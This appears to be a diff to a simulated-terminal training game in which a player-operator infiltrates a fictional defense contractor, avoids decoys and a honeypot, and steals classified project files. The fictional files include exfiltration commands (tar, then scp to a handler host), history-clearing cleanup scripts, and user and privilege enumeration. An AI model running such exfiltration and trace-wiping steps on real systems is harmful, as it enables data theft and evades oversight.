+10.0.0.42 ecdsa-sha2-nistp256 AAAA[REDACTED] # internal-db
+10.0.0.100 ecdsa-sha2-nistp256 AAAA[REDACTED] # file-server
+192.168.1.50 ecdsa-sha2-nistp256 AAAA[REDACTED] # CHIMERA workstation (this host)
+`
                 },
                 '/home/ghost/.ssh/authorized_keys': {
                     type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 128,
-                    content: 'ssh-ed25519 AAAA[REDACTED] specter-1@handler\n'
+                    content: 'ssh-ed25519 AAAA[REDACTED] specter-1@handler\nssh-ed25519 AAAA[REDACTED] wraith-7@shadow # previous operator\n'
                 },
-                '/home/ghost/mission': {
-                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
-                    children: ['briefing.txt', 'objectives.txt', 'contacts.txt', 'rules_of_engagement.txt']
-                },
-                '/home/ghost/mission/briefing.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 1024,
-                    content: `OPERATION CHIMERA - FINAL MISSION BRIEFING
-==========================================
-Classification: TOP SECRET//NOFORN
-Date: 2026-01-17
-Handler: SPECTER-1
+                '/home/ghost/.ssh/config': {
+                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 256,
+                    content: `# SSH Config for CHIMERA operation
+Host handler
+    HostName 10.0.0.1
+    User handler
+    IdentityFile ~/.ssh/id_ed25519
 
-SITUATION:
-You have achieved initial foothold on the CHIMERA network.
-This is the final test of your CLI Ghost capabilities.
-
-TARGET ORGANIZATION: Chimera Holdings Inc.
-NETWORK: Isolated high-security environment
-ACCESS: Standard user "ghost" via SSH key exchange
-
-MISSION OBJECTIVES:
-1. Complete environment reconnaissance
-2. Identify privilege escalation paths
-3. Locate classified project documentation
-4. Extract verification code from classified data
-5. Prepare intelligence package for exfiltration
-
-SUCCESS CRITERIA:
-- All objectives completed without triggering alerts
-- Verification code (PHOENIX-7) identified and confirmed
-- Intel package staged for exfiltration
-
-"The chimera tests all your skills. Only true Ghosts complete it."
+Host internal
+    HostName 10.0.0.42
+    User ghost
 `
                 },
-                '/home/ghost/mission/objectives.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 640,
-                    content: `MISSION OBJECTIVES - DETAILED
-==============================
 
-[X] Objective 1: RECON
-    - Establish identity (whoami)
-    - Confirm position (pwd)
-    - Survey environment (ls -la)
+                // ═══════════════════════════════════════════════════════════
+                // MISSION DIRECTORY - Operational parameters
+                // ═══════════════════════════════════════════════════════════
+                '/home/ghost/mission': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
+                    children: ['briefing.txt', 'intel_brief.txt', 'contacts.txt', 'rules_of_engagement.txt', 'target_profile.txt']
+                },
+                '/home/ghost/mission/briefing.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 1536,
+                    content: `OPERATION CHIMERA - MISSION BRIEFING
+=====================================
+Classification: TOP SECRET // NOFORN // CHIMERA
+Date: 2026-01-17 03:00 UTC
+Handler: SPECTER-1
+Previous Operator: WRAITH-7 (extracted, mission incomplete)
 
-[ ] Objective 2: INTEL GATHERING
-    - Read all mission files
-    - Understand target organization
-    - Identify data locations
+═══════════════════════════════════════════════════════════
+SITUATION
+═══════════════════════════════════════════════════════════
+Chimera Holdings Inc. operates a classified R&D network.
+Multiple projects exist - most are legitimate defense work.
+ONE project contains intelligence of critical importance.
 
-[ ] Objective 3: PRIVILEGE ANALYSIS
-    - Find SUID binaries
-    - Check sudo capabilities
-    - Identify escalation vectors
+WRAITH-7 attempted extraction on 2026-01-15 but accessed
+the WRONG project (Hydra instead of Medusa). Soft alert
+triggered. WRAITH-7 extracted before compromise confirmed.
 
-[ ] Objective 4: DATA DISCOVERY
-    - Locate classified directory
-    - Identify target documents
-    - Find verification code
+You are replacing WRAITH-7. The mission continues.
 
-[ ] Objective 5: EXFILTRATION PREP
-    - Package intel with tar
-    - Stage in designated directory
-    - Confirm package integrity
+═══════════════════════════════════════════════════════════
+YOUR OBJECTIVES
+═══════════════════════════════════════════════════════════
+1. Complete system reconnaissance (know the environment)
+2. Identify the correct target (PROJECT MEDUSA)
+3. Locate and extract the verification code
+4. Package ONLY the Medusa project data
+5. Exfiltrate to handler at 10.0.0.1
+6. Cover all tracks before extraction
 
-VERIFICATION: Report code PHOENIX-7 upon completion
+═══════════════════════════════════════════════════════════
+CRITICAL WARNINGS
+═══════════════════════════════════════════════════════════
+- DO NOT access wrong project (Hydra/Cerberus are monitored)
+- DO NOT use decoy verification codes
+- DO NOT leave traces in logs
+- The correct verification code is in intel_brief.txt
+
+Handler: SPECTER-1 @ 10.0.0.1
+Exfil window: 0300-0500 UTC
+
+"Complete what WRAITH-7 could not."
+`
+                },
+                '/home/ghost/mission/intel_brief.txt': {
+                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 1024,
+                    content: `INTELLIGENCE BRIEF - PROJECT IDENTIFICATION
+============================================
+Classification: GHOST EYES ONLY
+
+TARGET IDENTIFICATION:
+The target is PROJECT MEDUSA - a signals intelligence program.
+Located in: /data/projects/medusa/
+
+DECOY PROJECTS (DO NOT ACCESS):
+- /data/projects/hydra/    <- WRAITH-7's mistake, MONITORED
+- /data/projects/cerberus/ <- honeypot, triggers IMMEDIATE alert
+- /data/archive/           <- old data, not mission relevant
+
+VERIFICATION CODES:
+Multiple codes exist in the system. Most are DECOYS.
+The ONLY valid mission verification code is:
+
+    MEDUSA-9
+
+This code is hidden in the Medusa project documentation.
+Any other code (HYDRA-3, CERBERUS-1, PHOENIX-7) will
+trigger security review and compromise the mission.
+
+DO NOT confuse this with other codes you may find.
+
+TARGET FILES:
+/data/projects/medusa/classified/  <- Primary target
+Package this directory for exfiltration.
+
+Handler confirmation phrase: "The serpent has nine heads"
 `
                 },
                 '/home/ghost/mission/contacts.txt': {
-                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 384,
+                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 512,
                     content: `OPERATIONAL CONTACTS
 ====================
-FOR EMERGENCY USE ONLY
+Classification: OPERATOR EYES ONLY
 
-Handler: SPECTER-1
-  - Contact: 10.0.0.1 (SSH)
-  - Backup: Dead drop at /tmp/.specter
+PRIMARY HANDLER: SPECTER-1
+  Location: 10.0.0.1
+  Protocol: SCP to /dropbox/
+  Backup: SSH with -T flag for commands
 
-Tech Support: WRAITH-3
-  - Available: 0200-0400 UTC
-  - Signal: knock-knock protocol
+TECH SUPPORT: WRAITH-3 (not WRAITH-7)
+  Available: 0200-0400 UTC only
+  Contact: Leave message at /tmp/.wraith
 
-Extraction: PHANTOM-9
-  - Trigger: File at /tmp/.extract
-  - Window: 15 minutes max
+EXTRACTION: PHANTOM-9
+  Trigger: touch /tmp/.extract
+  Window: 15 minutes from trigger
 
-ABORT CODE: BLACKOUT-ZERO
-Use only if mission is compromised.
+ABORT CODES:
+  BLACKOUT-ZERO  = need extraction, soft compromise
+  BLACKOUT-OMEGA = burn everything, hard compromise
+
+Emergency dead drop: /tmp/.specter
 `
                 },
                 '/home/ghost/mission/rules_of_engagement.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
-                    content: `RULES OF ENGAGEMENT
-===================
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 768,
+                    content: `RULES OF ENGAGEMENT - OPERATION CHIMERA
+========================================
 
-1. MINIMIZE FOOTPRINT
-   - Avoid unnecessary commands
+1. RECONNAISSANCE FIRST
+   - Always survey before acting
+   - Check for previous operator traces
+   - Identify all users and their privileges
+
+2. TARGET VERIFICATION
+   - Confirm target is PROJECT MEDUSA
+   - DO NOT access Hydra (monitored after WRAITH-7)
+   - DO NOT access Cerberus (honeypot)
+
+3. MINIMAL FOOTPRINT
+   - Access only what you need
    - Don't modify system files
-   - Clear history when done
+   - Clear history before extraction
 
-2. AVOID DETECTION
-   - Don't create new users
-   - Don't install software
-   - Don't open outbound connections (except to handler)
+4. DATA HANDLING
+   - Package only /data/projects/medusa/classified/
+   - Verify package before transfer
+   - Use staging directory
 
-3. DATA HANDLING
-   - Only copy designated targets
-   - Use staging directory for packaging
-   - Encrypt before exfiltration (if time permits)
+5. EXFILTRATION
+   - SCP to handler@10.0.0.1:/dropbox/
+   - Verify transfer complete
+   - Delete local package
 
-4. ABORT CONDITIONS
-   - Detection confirmed
-   - Mission parameters change
-   - Handler signals abort
+6. CLEANUP
+   - Remove all packages
+   - Clear command history
+   - Leave no trace
 
-Violation of ROE = Mission failure
+VIOLATION = MISSION FAILURE
 `
                 },
+                '/home/ghost/mission/target_profile.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 640,
+                    content: `TARGET ORGANIZATION PROFILE
+============================
+Organization: Chimera Holdings Inc.
+Industry: Defense Contracting
+Founded: 2015
+Employees: 450+
+Network: Isolated high-security
+
+KNOWN PROJECTS:
+  - Hydra: Autonomous systems (NOT TARGET - monitored)
+  - Cerberus: Perimeter defense (NOT TARGET - honeypot)
+  - Medusa: Signals intelligence (THIS IS YOUR TARGET)
+
+NETWORK LAYOUT (partial):
+  10.0.0.1   - External handler (your extraction point)
+  10.0.0.42  - Internal database
+  10.0.0.50  - This workstation
+  10.0.0.100 - File server
+  10.0.0.200 - Development server
+
+SECURITY NOTES:
+  - Previous breach detected (WRAITH-7 on 2026-01-15)
+  - Hydra directory now monitored
+  - Cerberus is confirmed honeypot
+`
+                },
+
+                // ═══════════════════════════════════════════════════════════
+                // NOTES DIRECTORY - Previous operator intel
+                // ═══════════════════════════════════════════════════════════
+                '/home/ghost/notes': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
+                    children: ['warning.txt', 'wraith7_debrief.txt', 'filesystem_map.txt']
+                },
+                '/home/ghost/notes/warning.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 384,
+                    content: `⚠️  WARNING - READ BEFORE PROCEEDING ⚠️
+=======================================
+
+WRAITH-7 compromised part of this mission.
+
+The Hydra project is now MONITORED.
+The Cerberus project is a HONEYPOT.
+
+Your target is MEDUSA. Only Medusa.
+
+Read the full debrief in wraith7_debrief.txt
+
+DO NOT make the same mistakes.
+`
+                },
+                '/home/ghost/notes/wraith7_debrief.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 1024,
+                    content: `WRAITH-7 POST-EXTRACTION DEBRIEF
+=================================
+Date: 2026-01-15
+Status: Incomplete mission, operator extracted
+
+TIMELINE OF EVENTS:
+-------------------
+02:30 - WRAITH-7 gained access via SSH
+02:35 - Initial recon completed
+02:40 - WRAITH-7 accessed /data/projects/hydra/ (WRONG TARGET)
+02:42 - Soft alert triggered by Hydra access
+02:45 - WRAITH-7 found verification code HYDRA-3
+02:47 - WRAITH-7 attempted verification with HYDRA-3 (FAILED)
+02:50 - Security review initiated
+02:55 - WRAITH-7 emergency extraction
+
+ERRORS MADE:
+------------
+1. Did not read intel_brief.txt thoroughly
+2. Assumed Hydra was the target (name similarity to Chimera)
+3. Used wrong verification code (HYDRA-3 is a decoy)
+4. Did not check project list before accessing
+
+LESSONS FOR SUCCESSOR:
+----------------------
+- The target is MEDUSA, not Hydra
+- Valid verification code is MEDUSA-9 (in intel_brief.txt)
+- Check /data/projects/ structure BEFORE accessing anything
+- Cerberus is a honeypot - instant compromise if accessed
+
+Complete this mission. Don't repeat WRAITH-7's mistakes.
+`
+                },
+                '/home/ghost/notes/filesystem_map.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
+                    content: `FILESYSTEM RECONNAISSANCE MAP
+=============================
+Compiled by WRAITH-7 before extraction
+
+/data/
+├── projects/
+│   ├── hydra/      <- MONITORED (WRAITH-7 triggered alert)
+│   ├── cerberus/   <- HONEYPOT (do not access)
+│   └── medusa/     <- TARGET (uncompromised)
+│       └── classified/  <- Package this for exfil
+├── archive/        <- Old data, not relevant
+├── public/         <- Company info, safe to read
+└── backups/        <- Backup system, no access
+
+/var/log/           <- Check auth.log for previous access
+/etc/               <- User enumeration via passwd
+
+Target for exfil: /data/projects/medusa/classified/
+`
+                },
+
+                // ═══════════════════════════════════════════════════════════
+                // TOOLS & STAGING
+                // ═══════════════════════════════════════════════════════════
                 '/home/ghost/tools': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
-                    children: ['scanner.sh', 'privesc_check.sh', 'exfil.sh', 'cleanup.sh']
+                    children: ['scanner.sh', 'exfil.sh', 'cleanup.sh', 'verify.sh']
                 },
                 '/home/ghost/tools/scanner.sh': {
-                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 384,
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 256,
                     content: `#!/bin/bash
-# scanner.sh - Environment reconnaissance
-echo "[*] Chimera Scanner v1.0"
-echo "========================"
+# Quick environment scan
+echo "[*] Chimera Scanner"
+echo "User: $(whoami)"
+echo "Host: $(hostname)"
+echo "Dir:  $(pwd)"
 echo ""
-echo "[+] Current User: $(whoami)"
-echo "[+] Hostname: $(hostname)"
-echo "[+] Working Dir: $(pwd)"
-echo ""
-echo "[+] Users on system:"
-cat /etc/passwd | grep -v "nologin" | cut -d: -f1
-echo ""
-echo "[+] Network connections:"
-netstat -an 2>/dev/null | head -10
-echo ""
-echo "[*] Scan complete"
-`
-                },
-                '/home/ghost/tools/privesc_check.sh': {
-                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 512,
-                    content: `#!/bin/bash
-# privesc_check.sh - Privilege escalation enumeration
-echo "[*] Privilege Escalation Check"
-echo "=============================="
-echo ""
-echo "[+] SUID Binaries:"
-find / -perm -4000 -type f 2>/dev/null
-echo ""
-echo "[+] Sudo capabilities:"
-sudo -l 2>/dev/null
-echo ""
-echo "[+] Writable directories:"
-find / -writable -type d 2>/dev/null | head -10
-echo ""
-echo "[+] Interesting files in /data:"
-ls -la /data/ 2>/dev/null
-echo ""
-echo "[*] Check complete"
+echo "[*] Check /data/projects/ for targets"
+echo "[*] Read mission/intel_brief.txt for verification code"
 `
                 },
                 '/home/ghost/tools/exfil.sh': {
                     type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 384,
                     content: `#!/bin/bash
-# exfil.sh - Data exfiltration helper
+# Exfiltration helper - MEDUSA operation
 if [ -z "$1" ]; then
     echo "Usage: ./exfil.sh <source_dir>"
-    echo "Packages directory and stages for extraction"
+    echo "Example: ./exfil.sh /data/projects/medusa/classified/"
     exit 1
 fi
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-PACKAGE="staging/chimera_intel_$TIMESTAMP.tar.gz"
-tar -czf "$PACKAGE" "$1" 2>/dev/null
-echo "[+] Package created: $PACKAGE"
-echo "[+] Size: $(du -h $PACKAGE | cut -f1)"
-echo "[+] Ready for exfiltration to handler"
+tar -czf staging/medusa_intel.tar.gz "$1" 2>/dev/null
+echo "[+] Package: staging/medusa_intel.tar.gz"
+echo "[+] Transfer: scp staging/medusa_intel.tar.gz handler@10.0.0.1:/dropbox/"
 `
                 },
                 '/home/ghost/tools/cleanup.sh': {
                     type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 256,
                     content: `#!/bin/bash
-# cleanup.sh - Post-operation cleanup
-echo "[*] Initiating cleanup..."
-rm -rf staging/*
+# Post-op cleanup
+rm -rf ~/staging/*.tar.gz 2>/dev/null
 history -c
 echo "" > ~/.bash_history
-echo "[+] Staging cleared"
-echo "[+] History cleared"
-echo "[*] Ghost protocol complete"
+echo "[+] Cleanup complete"
+echo "[+] Ready for extraction"
+`
+                },
+                '/home/ghost/tools/verify.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 192,
+                    content: `#!/bin/bash
+# Verify package before transfer
+ls -la ~/staging/
+echo ""
+echo "Verify contents with: tar -tzf staging/*.tar.gz | head"
 `
                 },
                 '/home/ghost/staging': {
@@ -8436,185 +8651,513 @@ echo "[*] Ghost protocol complete"
                     children: ['README.txt']
                 },
                 '/home/ghost/staging/README.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
                     content: `STAGING DIRECTORY
 =================
-Use this directory to prepare intelligence packages.
+Place exfil packages here before transfer.
 
-Commands:
-  tar -czf staging/intel.tar.gz /data/classified/
+WORKFLOW:
+1. Package:  tar -czf staging/intel.tar.gz /data/projects/medusa/classified/
+2. Verify:   ls -la staging/
+3. Transfer: scp staging/intel.tar.gz handler@10.0.0.1:/dropbox/
+4. Cleanup:  rm staging/intel.tar.gz && history -c
 
-Then use exfil.sh or manual SCP to handler.
+Handler: SPECTER-1 @ 10.0.0.1
+Target:  /data/projects/medusa/classified/
+
+⚠️ Do NOT package Hydra or Cerberus data!
 `
                 },
                 '/home/ghost/recon': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
-                    children: ['network_map.txt', 'user_list.txt']
+                    children: ['network_map.txt', 'user_enum.txt', 'service_list.txt']
                 },
                 '/home/ghost/recon/network_map.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
+                    content: `CHIMERA NETWORK MAP
+===================
+Compiled from SSH known_hosts and internal docs
+
+10.0.0.1    - Handler (SPECTER-1) - YOUR EXFIL POINT
+10.0.0.42   - Internal database server
+10.0.0.50   - This workstation (CHIMERA)
+10.0.0.100  - Primary file server
+10.0.0.200  - Development server
+
+External gateway: 192.168.1.1
+Your local IP: 192.168.1.50 / 10.0.0.50
+
+Exfil command:
+  scp staging/intel.tar.gz handler@10.0.0.1:/dropbox/
+`
+                },
+                '/home/ghost/recon/user_enum.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 384,
-                    content: `CHIMERA NETWORK MAP (PARTIAL)
-=============================
-Gathered during initial reconnaissance
-
-10.0.0.1    - Handler (SPECTER-1)
-10.0.0.42   - Internal server
-10.0.0.100  - Database server
-10.0.0.200  - File server (classified data)
-
-CHIMERA host (you are here):
-  - IP: 10.0.0.50
-  - Role: Workstation
-  - Access: User-level
-`
-                },
-                '/home/ghost/recon/user_list.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
-                    content: `ENUMERATED USERS
+                    content: `USER ENUMERATION
 ================
-root - System administrator
-ghost - Current access (you)
-admin - IT administrator
-chimera - Service account
-backup - Backup service
+From /etc/passwd analysis:
 
-Note: "admin" has sudo privileges
+root     - System admin (UID 0)
+ghost    - Your account (UID 1000) - standard user
+admin    - IT administrator (UID 1001) - has sudo
+svc_chimera - Service account (UID 999) - no shell
+backup   - Backup service (UID 998) - no shell
+analyst  - Data analyst (UID 1002) - standard user
+
+Note: 'admin' is the only non-root user with elevated privileges
+Check /var/log/auth.log for their activity patterns
 `
                 },
+                '/home/ghost/recon/service_list.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
+                    content: `RUNNING SERVICES
+================
+Port 22   - SSH (your access method)
+Port 80   - Internal web portal
+Port 443  - HTTPS
+Port 3306 - MySQL (internal-db)
+Port 5432 - PostgreSQL
+
+No outbound restrictions detected.
+Handler at 10.0.0.1:22 is reachable.
+`
+                },
+
+                // ═══════════════════════════════════════════════════════════
+                // /data - Target filesystem with decoys
+                // ═══════════════════════════════════════════════════════════
                 '/data': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
-                    children: ['classified', 'public', 'backups']
+                    children: ['projects', 'archive', 'public', 'backups']
                 },
+                '/data/projects': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'projects',
+                    children: ['hydra', 'cerberus', 'medusa', 'README.txt']
+                },
+                '/data/projects/README.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
+                    content: `CHIMERA HOLDINGS - PROJECT DIRECTORY
+=====================================
+Active classified projects.
+
+⚠️  All access is logged and monitored.
+⚠️  Unauthorized access will trigger security response.
+
+See individual project directories for details.
+`
+                },
+
+                // HYDRA - Decoy (monitored after WRAITH-7)
+                '/data/projects/hydra': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'projects',
+                    children: ['summary.txt', 'specs.txt', 'verification.txt']
+                },
+                '/data/projects/hydra/summary.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 384,
+                    content: `PROJECT HYDRA - SUMMARY
+=======================
+Status: ACTIVE (MONITORED - breach detected 2026-01-15)
+
+Project Type: Autonomous Systems
+Budget: $30M
+Timeline: 2024-2026
+
+⚠️  THIS DIRECTORY IS UNDER ENHANCED MONITORING
+⚠️  Previous unauthorized access logged
+⚠️  All queries forwarded to security team
+
+Note: If you're seeing this, you may have the wrong target.
+`
+                },
+                '/data/projects/hydra/specs.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 256,
+                    content: `[CLASSIFIED - HYDRA SPECIFICATIONS]
+Access logged. Security notified.
+`
+                },
+                '/data/projects/hydra/verification.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 192,
+                    content: `HYDRA VERIFICATION CODE: HYDRA-3
+
+⚠️  WARNING: This is a DECOY code.
+Using this code will trigger security review.
+`
+                },
+
+                // CERBERUS - Honeypot
+                '/data/projects/cerberus': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'projects',
+                    children: ['README.txt', 'secrets.txt']
+                },
+                '/data/projects/cerberus/README.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 256,
+                    content: `PROJECT CERBERUS - PERIMETER DEFENSE
+=====================================
+Status: ACTIVE
+
+[Further content requires elevated access]
+`
+                },
+                '/data/projects/cerberus/secrets.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 384,
+                    content: `🚨 HONEYPOT TRIGGERED 🚨
+
+This file is a security trap.
+Your access has been logged.
+IP: [DETECTED]
+User: [CAPTURED]
+Time: [RECORDED]
+
+Security team has been notified.
+
+CERBERUS VERIFICATION CODE: CERBERUS-1
+(This is a trap code - do not use)
+`
+                },
+
+                // MEDUSA - The actual target
+                '/data/projects/medusa': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'projects',
+                    children: ['overview.txt', 'classified', 'personnel.txt', 'timeline.txt']
+                },
+                '/data/projects/medusa/overview.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 512,
+                    content: `PROJECT MEDUSA - OVERVIEW
+=========================
+Classification: TOP SECRET // MEDUSA // NOFORN
+Status: ACTIVE
+
+Project Type: Signals Intelligence Platform
+Objective: Advanced SIGINT collection and analysis
+Budget: $75M USD
+Timeline: 2025-2028
+
+Key capabilities:
+- Real-time signal processing
+- Pattern recognition AI
+- Encrypted channel analysis
+
+See /classified/ for sensitive documentation.
+
+Project Lead: [REDACTED]
+Oversight: [REDACTED]
+`
+                },
+                '/data/projects/medusa/personnel.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 384,
+                    content: `MEDUSA - CLEARED PERSONNEL
+===========================
+[Names and clearances REDACTED for operational security]
+
+Total cleared: 23
+Locations: 3 sites
+Access levels: TS/SCI required
+
+Note: Personnel roster in classified/team_roster.txt
+`
+                },
+                '/data/projects/medusa/timeline.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'projects', size: 384,
+                    content: `MEDUSA - PROJECT TIMELINE
+=========================
+Q1 2025: Project initiation
+Q2 2025: Core development
+Q3 2025: Initial testing
+Q4 2025: Field trials
+Q1 2026: Current phase - integration
+Q2 2026: Deployment preparation
+
+Verification code for milestone reporting: MEDUSA-9
+
+All timeline updates require this code for authentication.
+`
+                },
+                '/data/projects/medusa/classified': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'classified',
+                    children: ['project_medusa.pdf', 'architecture.docx', 'sigint_protocols.xlsx', 'verification_codes.txt', 'team_roster.txt']
+                },
+                '/data/projects/medusa/classified/project_medusa.pdf': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 5242880,
+                    content: `[TOP SECRET // MEDUSA // NOFORN]
+
+PROJECT MEDUSA - EXECUTIVE SUMMARY
+==================================
+Document ID: MEDUSA-2026-001
+Classification: TOP SECRET
+
+1. PROJECT OVERVIEW
+   Medusa is a next-generation signals intelligence platform
+   designed for passive collection of encrypted communications.
+
+2. TECHNICAL CAPABILITIES
+   - Multi-spectrum signal processing
+   - Real-time decryption analysis
+   - AI-powered pattern recognition
+   - Quantum-resistant architecture
+
+3. DEPLOYMENT STATUS
+   Phase 1: Complete
+   Phase 2: In progress (85%)
+   Phase 3: Scheduled Q3 2026
+
+4. BUDGET ALLOCATION
+   FY2025: $25M (spent)
+   FY2026: $30M (allocated)
+   FY2027: $20M (projected)
+
+5. VERIFICATION
+   Mission Verification Code: MEDUSA-9
+
+   This code confirms successful access to Medusa documentation.
+   Report to handler upon extraction.
+
+[END CLASSIFIED DOCUMENT]
+`
+                },
+                '/data/projects/medusa/classified/architecture.docx': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 2097152,
+                    content: '[CLASSIFIED - System architecture diagrams and specifications]'
+                },
+                '/data/projects/medusa/classified/sigint_protocols.xlsx': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 1048576,
+                    content: '[CLASSIFIED - Signals intelligence collection protocols]'
+                },
+                '/data/projects/medusa/classified/verification_codes.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 384,
+                    content: `MEDUSA PROJECT - VERIFICATION CODES
+====================================
+Document Classification: SECRET
+
+Mission Verification:    MEDUSA-9
+Handler Confirmation:    SPECTER-GAMMA
+Abort Code:             BLACKOUT-ZERO
+
+⚠️ These codes are PROJECT MEDUSA specific.
+Do not confuse with Hydra or Cerberus codes.
+
+MEDUSA-9 is the ONLY valid mission verification code.
+`
+                },
+                '/data/projects/medusa/classified/team_roster.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 512,
+                    content: `MEDUSA - TEAM ROSTER
+====================
+[REDACTED FOR OPERATIONAL SECURITY]
+
+Project Director: [REDACTED]
+Lead Engineer: [REDACTED]
+Security Officer: [REDACTED]
+
+Total personnel: 23
+Clearance level: TS/SCI
+Access verification: MEDUSA-9
+`
+                },
+
+                // Archive - Red herring
+                '/data/archive': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['old_projects.txt', 'deprecated_codes.txt']
+                },
+                '/data/archive/old_projects.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
+                    content: `ARCHIVED PROJECTS
+=================
+- Phoenix (completed 2023)
+- Sphinx (cancelled 2024)
+- Griffin (merged into Hydra)
+
+These projects are no longer active.
+Current projects are in /data/projects/
+`
+                },
+                '/data/archive/deprecated_codes.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 384,
+                    content: `DEPRECATED VERIFICATION CODES
+=============================
+DO NOT USE - Historical reference only
+
+PHOENIX-7  - Old project code (2023)
+SPHINX-2   - Cancelled project
+GRIFFIN-4  - Merged project
+
+Current project codes:
+- HYDRA-3    (Hydra project)
+- CERBERUS-1 (Cerberus project)
+- MEDUSA-9   (Medusa project)
+
+⚠️ Phoenix codes are no longer valid for any mission.
+`
+                },
+
+                // Public - Safe to read
                 '/data/public': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
-                    children: ['company_info.txt']
+                    children: ['company_info.txt', 'org_chart.txt']
                 },
                 '/data/public/company_info.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
-                    content: `Chimera Holdings Inc.
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 384,
+                    content: `CHIMERA HOLDINGS INC.
 =====================
 Founded: 2015
 Industry: Defense Contracting
-Classification: See /data/classified for project details
+Headquarters: [CLASSIFIED]
+Employees: 450+
+
+Active Projects: 3 (see /data/projects/)
+Archived Projects: 3 (see /data/archive/)
+
+Public contact: info@chimeraholdings.example
 `
                 },
+                '/data/public/org_chart.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
+                    content: `ORGANIZATION STRUCTURE
+======================
+CEO: [REDACTED]
+CTO: [REDACTED]
+CISO: [REDACTED]
+
+Departments:
+- Engineering (120)
+- Security (45)
+- Analysis (85)
+- Operations (200)
+`
+                },
+
+                // Backups - No access
                 '/data/backups': {
                     type: 'dir', perms: 'drwx------', owner: 'backup', group: 'backup',
-                    children: ['db_backup.sql.gz']
+                    children: ['db_backup.sql.gz', 'files_backup.tar.gz']
                 },
-                '/data/classified': {
-                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'classified',
-                    children: ['project_chimera.pdf', 'asset_network.xlsx', 'operational_plans.docx', 'verification_codes.txt']
-                },
-                '/data/classified/project_chimera.pdf': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'classified', size: 5242880,
-                    content: `[TOP SECRET//CHIMERA//NOFORN]
 
-PROJECT CHIMERA - Executive Summary
-===================================
-
-Project Status: ACTIVE
